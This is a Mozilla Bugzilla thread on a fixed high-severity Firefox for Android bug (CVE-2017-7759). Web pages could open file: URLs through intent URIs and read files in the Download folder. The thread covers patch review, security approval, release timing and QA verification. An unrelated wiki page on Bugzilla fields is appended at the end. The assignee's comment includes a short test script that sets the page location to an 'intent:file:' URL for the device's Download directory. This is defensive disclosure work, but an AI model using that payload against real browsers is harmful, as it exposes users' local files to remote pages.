| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1356893#c10)• 8 years ago |
|  | |

Eugen, do you need further help to figure out next steps?
This is an externally reported high severity security bug, we'd like this sorted out as quickly as possible.Flags: needinfo?(esawin)

|  | [Eugen Sawin [:esawin]](/user_profile?user_id=495422)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1356893#c11)• 8 years ago |
|  | |

Attached patch

[0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch](attachment.cgi?id=8862432&action=diff) (obsolete)
— [Details](attachment.cgi?id=8862432&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862432)

Given the severity of this bug, we should respond swiftly by blocking this specific attack vector and then work towards a more robust and secure handling of file URIs and downloads on Android.
With this patch, we block opening intents containing "file"-scheme data URIs.
As the next step, we can discuss and address potential same-origin policy and download prompt changes.Flags: needinfo?(esawin)
[Attachment #8862432](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") -
Flags: review?(s.kaspari)

|  | [Sebastian Kaspari (:sebastian; :pocmo)](/user_profile?user_id=472516) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1356893#c12)• 8 years ago |
|  | |

Comment on [attachment 8862432](/attachment.cgi?id=8862432 "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862432&action=diff "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862432)
0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch
Review of [attachment 8862432](/attachment.cgi?id=8862432 "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862432&action=diff "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862432):
-----------------------------------------------------------------
This only affects link on websites and does not break file:// intents from other apps, right?
::: mobile/android/base/java/org/mozilla/gecko/IntentHelper.java
@@ +280,5 @@
> return null;
> }
>
> + final Uri data = intent.getData();
> + if (data != null && "file".equals(data.getScheme())) {
Is the scheme always lower case at this point? Not sure if schemes are case insensitive.
[Attachment #8862432](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") -
Flags: review?(s.kaspari) → review+

|  | [Nick Alexander :nalexander [he/him]](/user_profile?user_id=432887) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1356893#c13)• 8 years ago |
|  | |

Comment on [attachment 8862432](/attachment.cgi?id=8862432 "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862432&action=diff "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862432)
0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch
Review of [attachment 8862432](/attachment.cgi?id=8862432 "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862432&action=diff "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862432):
-----------------------------------------------------------------
To sebastian's other question, about what this impacts, from <https://dxr.mozilla.org/mozilla-central/rev/0b77ed3f26c5335503bc16e85b8c067382e7bb1e/mobile/android/base/java/org/mozilla/gecko/IntentHelper.java#274> we can see that this only applies to "intent://" or "android-app://" "outer schemes". But I doubt this code can differentiate based on where those outer schemes come from -- so if an App such as "am start" (i.e., not Web Content) sends us such an Intent, we'll drop it on the floor as well.
eugen: consider logging that we're dropping a file:// URI (without leaking the URI itself).
::: mobile/android/base/java/org/mozilla/gecko/IntentHelper.java
@@ +282,5 @@
>
> + final Uri data = intent.getData();
> + if (data != null && "file".equals(data.getScheme())) {
> + return null;
> + }
Based on <https://developer.android.com/reference/android/net/Uri.html#normalizeScheme>(), I'd say no, schemes are not case insensitive. (It's possible we always normalize before this point, but I'd lowercase the scheme anyway to be clear.)
[Attachment #8862432](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") -
Flags: feedback+

|  | [Max Liu [:maliu]](/user_profile?user_id=578584) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1356893#c14)• 8 years ago |
|  | |

Comment on [attachment 8862432](/attachment.cgi?id=8862432 "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862432&action=diff "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862432)
0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch
+ if (data != null && "file".equals(data.getScheme())) {
To avoid "file", ContentResolver.SCHEME\_FILE probably provide more context for tracing.
[Attachment #8862432](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") -
Flags: feedback+

|  | [Eugen Sawin [:esawin]](/user_profile?user_id=495422)  Assignee |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1356893#c15)• 8 years ago |
|  | |

Attached patch

[0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch](attachment.cgi?id=8862510&action=diff)
— [Details](attachment.cgi?id=8862510&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510)

(In reply to Sebastian Kaspari (:sebastian) from [comment #12](/show_bug.cgi?id=1356893#c12 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs"))
> This only affects link on websites and does not break file:// intents from
> other apps, right?
As Nick has explained, this would block us from handling all "nested" file-scheme intent URIs ("intent:file://..."), it will not affect handling regular file-scheme URIs ("file://...").
However, with this patch we also block "nested" file-scheme intent URIs for MIME types that we don't support. But I'm not aware of any legitimate use cases for this scenario.
> Is the scheme always lower case at this point? Not sure if schemes are case
> insensitive.
Schemes are case sensitive, but Android would ignore invalid (non-normalized) scheme intents.
I've fixed it in this version.
(In reply to Max Liu [:maliu] from [comment #14](/show_bug.cgi?id=1356893#c14 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs"))
> To avoid "file", ContentResolver.SCHEME\_FILE probably provide more context
> for tracing.
ContentResolver doesn't provide all the SCHEME\_\* constants we care about in this module ("file", "intent", "sms", etc.) so using the string literal seems more consistent and clear. If we're interested in changing that, we should do it consistently across all scheme handling code (in a new bug).
[Attachment #8862432](/attachment.cgi?id=8862432&action=edit "0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch") -
Attachment is obsolete: true
[Attachment #8862510](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") -
Flags: review?(nalexander)

|  | [Nick Alexander :nalexander [he/him]](/user_profile?user_id=432887) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1356893#c16)• 8 years ago |
|  | |

Comment on [attachment 8862510](/attachment.cgi?id=8862510 "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862510&action=diff "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510)
0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch
Review of [attachment 8862510](/attachment.cgi?id=8862510 "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862510&action=diff "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510):
-----------------------------------------------------------------
lgtm.
[Attachment #8862510](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") -
Flags: review?(nalexander) → review+

|  | [Eugen Sawin [:esawin]](/user_profile?user_id=495422)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1356893#c17)• 8 years ago |
|  | |

Frederik, can you provide assistance with the phrasing and categorization of this patch for the sec-approval request?
I would suggest that an exploit can be easily constructed based on both, the diff and the patch description.Flags: needinfo?(fbraun)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1356893#c18)• 8 years ago |
|  | |

The diff points straight to the attack and there's nothing we can do about that.
I think this means we land it just before we release the next version, so that we don't 0day our users.
I'm not sure what you're asking, but I can request approval in your stead.Flags: needinfo?(fbraun)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1356893#c19)• 8 years ago |
|  | |

If you request sec-approval, use something like this for the first two answers.
Can someone create an exploit based on the patch?
Yep, easily.
Do code or comment hint at a security issue?
Both comment and code, so removing the comment wouldnt be of any help. It's pretty obvious.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1356893#c20)• 8 years ago |
|  | |

There is no "landing just before release." Code has to land before the last beta in order to be in the beta.
Can someone just set sec-approval? on the patch and answer \*all\* of the questions in the template, please?

|  | [Eugen Sawin [:esawin]](/user_profile?user_id=495422)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1356893#c21)• 8 years ago |
|  | |

Comment on [attachment 8862510](/attachment.cgi?id=8862510 "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862510&action=diff "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510)
0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
Very easily, the patch provides enough hints for the construction of an exploit.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
Yes, both the logging and the patch description paraphrase the code change, which provides a hint on the security problem.
Which older supported branches are affected by this flaw?
All branches are affected.
If not all supported branches, which bug introduced the flaw?
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
This patch should be trivial to uplift.
How likely is this patch to cause regressions; how much testing does it need?
It is unlikely to cause regressions for legitimate and regular use cases.
[Attachment #8862510](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") -
Flags: sec-approval?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a1411193_1689)• 8 years ago |

Flags: needinfo?(dveditz)Keywords: [csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1356893#c22)• 8 years ago |
|  | |

Comment on [attachment 8862510](/attachment.cgi?id=8862510 "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862510&action=diff "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510)
0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch
Review of [attachment 8862510](/attachment.cgi?id=8862510 "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862510&action=diff "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510):
-----------------------------------------------------------------
sec-approval=dveditz
[Attachment #8862510](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1356893#c23)• 8 years ago |
|  | |

(In reply to Eugen Sawin [:esawin] from [comment #21](/show_bug.cgi?id=1356893#c21 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs"))
> How easily could an exploit be constructed based on the patch?
> Very easily, the patch provides enough hints for the construction of an exploit.
We should probably wait until closer to release before landing, and then hit m-c and beta at the same time. Let's say May 22 or so.Whiteboard: [wait until 5/22 to land]

|  | [Michael Comella (:mcomella) [NI reported issues only: ex-Mozilla]](/user_profile?user_id=441872) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1356893#c24)• 8 years ago |
|  | |

I assume I'm not needed anymore - if I am, please email me.Flags: needinfo?(michael.l.comella)

|  | [Eugen Sawin [:esawin]](/user_profile?user_id=495422)  Assignee |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1356893#c25)• 8 years ago |
|  | |

As discussed on IRC, I'm going to land this on 5/29 and request beta uplift on the same day.

|  | [Wesley Huang [:wesley\_huang] (EPM) (NI me)](/user_profile?user_id=487151) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1356893#c26)• 8 years ago |
|  | |

[Tracking Requested - why for this release]:
per [comment 25](/show_bug.cgi?id=1356893#c25 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs")tracking-fennec: 54+ → +
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=affected)
[tracking-firefox54](/buglist.cgi?f1=cf_tracking_firefox54&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%3F)

|  | [Gerry Chang [:gchang]](/user_profile?user_id=506302) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1356893#c27)• 8 years ago |
|  | |

Track 54+ as sec-high.
[tracking-firefox54](/buglist.cgi?f1=cf_tracking_firefox54&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1356893#c28)• 8 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/f9732aefcc19ba7cf02b7cb864ba6c54a55f70bf>
Sebastian, can you please request Beta approval on this when you get a chance? I've already confirmed that it grafts cleanly.
[status-firefox53](/buglist.cgi?f1=cf_status_firefox53&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox53&o1=equals&v1=wontfix)
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=wontfix)
[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F)Flags: needinfo?(s.kaspari)Whiteboard: [wait until 5/22 to land]

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a3105683_580382)• 8 years ago |

[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B)

|  | [Wes Kocher (:KWierso) (Not reading bugmail; email directly if needed)](/user_profile?user_id=308534) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1356893#c29)• 8 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/f9732aefcc19>
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed)Target Milestone: --- → Firefox 55

|  | [Sebastian Kaspari (:sebastian; :pocmo)](/user_profile?user_id=472516) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1356893#c30)• 8 years ago |
|  | |

Comment on [attachment 8862510](/attachment.cgi?id=8862510 "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862510&action=diff "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510)
0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch
Approval Request Comment
[Feature/Bug causing the regression]: Security issue, see [comment 21](/show_bug.cgi?id=1356893#c21 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs") for details.
[User impact if declined]: See [comment 1](/show_bug.cgi?id=1356893#c1 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs"): "The redirection allows remote pages to exfiltrate files in /sdcard/Download/"
[Is this code covered by automated tests?]: -
[Has the fix been verified in Nightly?]: Patch just landed on m-c and was held back because it provides enough hints for the construction of an exploit
[Needs manual test from QE? If yes, steps to reproduce]: STR in [comment 1](/show_bug.cgi?id=1356893#c1 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs") and POC attached to bug.
[List of other uplifts needed for the feature/fix]: -
[Is the change risky?]: No
[Why is the change risky/not risky?]: ([comment 21](/show_bug.cgi?id=1356893#c21 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs")) It is unlikely to cause regressions for legitimate and regular use cases.
[String changes made/needed]: -Flags: needinfo?(s.kaspari)
[Attachment #8862510](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") -
Flags: approval-mozilla-beta?

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1356893#c31)• 8 years ago |
|  | |

Comment on [attachment 8862510](/attachment.cgi?id=8862510 "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[details]](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[diff]](/attachment.cgi?id=8862510&action=diff "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510)
0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch
sec-high fix for fennec 54.0b12
[Attachment #8862510](/attachment.cgi?id=8862510&action=edit "0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a3443787_580382)• 8 years ago |

Status: NEW → RESOLVEDClosed: 8 years agoResolution: --- → FIXED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1356893#c32)• 8 years ago |
|  | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/9664d83f5c05>
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=fixed)

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a4069707_452604)• 8 years ago |

Flags: qe-verify+Whiteboard: [post-critsmash-triage]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a4078799_1689)• 8 years ago |

Group: firefox-core-security → core-security-release

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a4417600_280903)• 8 years ago |

Whiteboard: [post-critsmash-triage] → [post-critsmash-triage][adv-main54+]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a4419710_280903)• 8 years ago |

Alias: CVE-2017-7759

|  | [Bogdan Surd, QA [:bsurd, NI]](/user_profile?user_id=563218) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1356893#c33)• 8 years ago |
|  | |

Devices:
- Nexus 5 (Android 6.0.1);
- Nexus 6 (Android 7.0);
- Huawei P10 (Android 7.0);
- LG G4 (Android 5.1);
- Lenovo A536 (Android 4.4.2).
Hello,
Verified this issue using the devices listed above by both opening the file from [Comment 1](/show_bug.cgi?id=1356893#c1 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs") locally and from a link.
Build:
- 54.0 (2017-07-06) - RC
The page downloads a local\_attack.html file and the user is redirected to a "The address wasn't understood" page.
No other actions are performed.
- 54.0b12 (2017-30-05) - Beta
The page downloads a local\_attack.html file and the user is redirected to a "The address wasn't understood" page.
No other actions are performed.
- 55.0a1 (2017-07-06) - Nightly
The page downloads a local\_attack.html file and no other actions are performed.
Notes:
The user can then open the local\_attack.html file if he so desires after it has finished downloading.
@Eugen It is unclear to me what would be the expected behavior. It would seem that there is another action happening in the RC and Beta build but no other action is taken in the Nightly one. The local\_attack.html file is not opened in any of these situations. If this is the desired effect please consider this issue as verified.Flags: needinfo?(esawin)

|  | [Eugen Sawin [:esawin]](/user_profile?user_id=495422)  Assignee |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1356893#c34)• 8 years ago |
|  | |

(In reply to Bogdan Surd, QA [:BogdanS] from [comment #33](/show_bug.cgi?id=1356893#c33 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs"))
> Verified this issue using the devices listed above by both opening the file
> from [Comment 1](/show_bug.cgi?id=1356893#c1 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs") locally and from a link.
[Comment 1](/show_bug.cgi?id=1356893#c1 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs") only contains the local\_attack.html, you need to verify against the remote\_attack.html from the description ([comment 0](/show_bug.cgi?id=1356893#c0 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs")).
> @Eugen It is unclear to me what would be the expected behavior. It would
> seem that there is another action happening in the RC and Beta build but no
> other action is taken in the Nightly one. The local\_attack.html file is not
> opened in any of these situations. If this is the desired effect please
> consider this issue as verified.
The expected behavior is that the "intent:file:..." URL is blocked and local\_attack.html is not opened.
There should not be any different behavior on Nightly (I couldn't reproduce it locally).
A minimal test page could be the following code:
<script>
location="intent:file:///storage/emulated/0/Download#Intent;type=text/html;end";
</script>
When opening the given test page above, the browser should block the URL (The address wasn't understood).
A compromised browser would show the contents of the local Download directory when opening the given test page.Flags: needinfo?(esawin)

|  | [Bogdan Surd, QA [:bsurd, NI]](/user_profile?user_id=563218) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1356893#c35)• 8 years ago |
|  | |

Hello,
Thank you for clearing this up for me and sorry for not being clear, I did use the remote\_attack.html. None of the browsers opened or showed the content of the local\_attack.html. Marking this as verified.Status: RESOLVED → VERIFIED
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=verified)
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=verified)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a5051995_280903)• 8 years ago |

Flags: sec-bounty?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a5532775_1689)• 8 years ago |

Flags: sec-bounty?Flags: sec-bounty+Flags: needinfo?(dveditz)

|  | [Richard Newman [:rnewman]](/user_profile?user_id=396243) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a5698724_396243)• 8 years ago |

Depends on: [1374200](/show_bug.cgi?id=1374200 "RESOLVED FIXED - Crash in java.lang.NoSuchMethodError: android.net.Uri.normalizeScheme at org.mozilla.gecko.IntentHelper.getOpenURIIntentInner(IntentHelper.java)")

|  | [Takeshi Terada](/user_profile?user_id=448978)  Reporter |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1356893#c36)• 7 years ago |
|  | |

Could you remove view restriction on this report please? I would like to mention this bug in my blog post I'm now preparing. Thanks.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a10128030_1689)• 7 years ago |

Group: core-security-releaseFlags: needinfo?(dveditz)

|  | [Sorina Florean [:sflorean]](/user_profile?user_id=565577) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1356893#c37)• 7 years ago |
|  | |

Removing qe-verify flag based on [comment 35](/show_bug.cgi?id=1356893#c35 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs").Flags: qe-verify+

|  | [Nobody; OK to take it and work on it](/user_profile?user_id=1) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a116215834_1)• 4 years ago |

Product: Firefox for Android → Firefox for Android Graveyard

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a224726627_5898)• 8 months ago |

[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[verified](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=verified) → ---Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1356893&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Takeshi Terada](/user_profile?user_id=448978)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wiki.mozilla.org_3659d679_20250126_030310.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
